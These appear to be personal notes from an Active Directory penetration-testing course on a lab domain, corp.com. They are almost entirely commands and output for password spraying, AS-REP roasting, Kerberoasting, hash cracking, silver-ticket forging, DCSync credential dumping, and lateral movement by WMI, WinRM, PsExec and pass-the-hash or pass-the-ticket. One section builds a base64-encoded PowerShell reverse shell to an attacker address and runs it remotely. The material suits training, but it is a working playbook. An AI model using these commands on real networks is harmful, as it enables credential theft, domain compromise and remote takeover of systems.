The request will be processed at a domain controller for domain corp.com.

The command completed successfully.

PS C:\Tools> runas /user:corp\robert cmd.exe

# =====================TargetB(WIN)
c:\Tools>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
PS C:\Tools> nslookup client74.corp.com
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.244.70

Name:    client74.corp.com
Address:  192.168.244.74

# =====================Kali
$ xfreerdp3 /u:robert /p:'Password123!' /d:corp.com /v:192.168.244.74
~~~

# Attacking Active Directory Authentication

## Performing Attacks on Active Directory Authentication

### Password Attacks
---

#### Showing password rules

~~~
PS C:\Users\jeff> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
~~~


#### Authenticating using DirectoryEntry

~~~ powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
~~~

#### Using Spray-Passwords to attack user accounts

~~~ powershell
cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
~~~

#### Using crackmapexec to attack user accounts

~~~ powershell
cat users.txt
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
~~~

#### Crackmapexec output indicating that the valid credentials have administrative privileges on the target

~~~ powershell
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
~~~


#### Using kerbrute to attack user accounts

~~~ powershell
type .\usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
~~~




### AS-REP Roasting
---

#### Using GetNPUsers to perform AS-REP roasting

~~~ bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete:'Nexus123!'
~~~

~~~ shell
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
~~~



#### Obtaining the correct mode for Hashcat

~~~ shell
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
~~~

#### Cracking the AS-REP hash with Hashcat

~~~ powershell
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
...
~~~


#### Using Rubeus to obtain the AS-REP hash of dave

~~~ powershell
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
~~~


#### Cracking the modified AS-REP hash

~~~ shell
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
...
~~~


### Kerberoasting
---

#### Utilizing Rubeus to perform a Kerberoast attack

~~~ powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
~~~


#### Using impacket-GetUserSPNs to perform Kerberoasting on Linux

~~~ bash
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
~~~


#### Cracking the TGS-REP hash

~~~ bash
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
~~~




### Silver Tickets
---


#### Trying to access the web page on WEB04 as user jeff

~~~ powershell
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error

  401 - Unauthorized: Access is denied due to invalid credentials.
  You do not have permission to view this directory or page using the credentials that you supplied.

At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
~~~

#### Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN

~~~ powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
~~~

#### Obtaining the domain SID

~~~ powershell
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
~~~

#### Forging the service ticket with the user jeffadmin and injecting it into the current session

~~~ powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
~~~


#### Listing Kerberos tickets to confirm the silver ticket is submitted to the current session

~~~ powershell
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
~~~

#### Accessing the SMB share with the silver ticket

~~~ powershell
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
Forms             :
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
                    text/html]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        :
RawContentLength  : 703
~~~


### Domain Controller Synchronization
---

#### Using Mimikatz to perform a dcsync attack to obtain the credentials of dave

~~~ powershell
PS C:\Users\jeffadmin> cd C:\Tools\

PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...
~~~



#### Using Hashcat to crack the NTLM hash obtained by the dcsync attack

~~~ powershell
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1              
...
~~~

#### Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator

~~~ powershell
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
~~~

#### Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave

~~~ bash
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
~~~

# Lateral Movement in Active Directory

## Active Directory Lateral Movement Techniques

### WMI and WinRM
---


#### Running the wmic utility to spawn a process on a remote system

~~~ shell
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5772;
        ReturnValue = 0;
};
~~~

#### Creating the PSCredential object in PowerShell

~~~ shell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
~~~

#### Creating a new CimSession

~~~ shell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
~~~

#### Invoking the WMI session through PowerShell

~~~ shell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
~~~

#### Executing the WMI PowerShell payload

~~~ shell
PS C:\Users\jeff> $username = 'jen';
...
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
~~~

#### Executing the WMI PowerShell payload

~~~ python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
~~~

#### Running the base64 encoder Python script

~~~ bash
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
~~~


#### Executing the WMI payload with base64 reverse shell

~~~ bash
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73
~~~

#### Executing commands remotely via WinRS

~~~ shell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
~~~

#### Running the reverse-shell payload through WinRS

~~~ shell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
~~~

#### Establishing a PowerShell Remote Session via WinRM

~~~ powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
~~~

#### Inspecting the PowerShell Remoting session

~~~ powershel
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
~~~


### PsExec
---

#### Obtaining an Interactive Shell on the Target System with PsExec

~~~ powershell
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
~~~

### Pass the Hash
---

#### Passing the hash using Impacket wmiexec

~~~ bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
~~~


### Overpass the Hash
---

#### Dumping password hash for 'jen'

~~~ powershell
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords

...
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session           : Interactive from 0
User Name         : jen
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/27/2023 7:43:20 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1124
        msv :
         [00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075
         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
        tspkg :
        wdigest :
         * Username : jen
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jen
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
...
~~~

#### Creating a process with a different user's NTLM password hash

~~~ powershell
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
~~~

#### Listing Kerberos tickets

~~~ powershell
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
~~~



#### Mapping a network share on a remote server

~~~ powershell
PS C:\Windows\system32> net use \\files04
The command completed successfully.
~~~

#### Listing Kerberos tickets

~~~ powershell
PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
~~~


#### Opening remote connection using Kerberos

~~~ powershell
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
~~~

### Pass the Ticket
---

#### Verifying that the user jen has no access to the shared folder

~~~ powershell
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
~~~


#### Exporting Kerberos TGT/TGS to disk

~~~ powershell
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 6:24:17 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
...
~~~

#### Exporting Kerberos TGT/TGS to disk

~~~ powershell
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
~~~

#### Injecting the selected TGS into process memory

~~~ powershell
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
~~~



#### Inspecting the injected ticket in memory

~~~ powershell
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
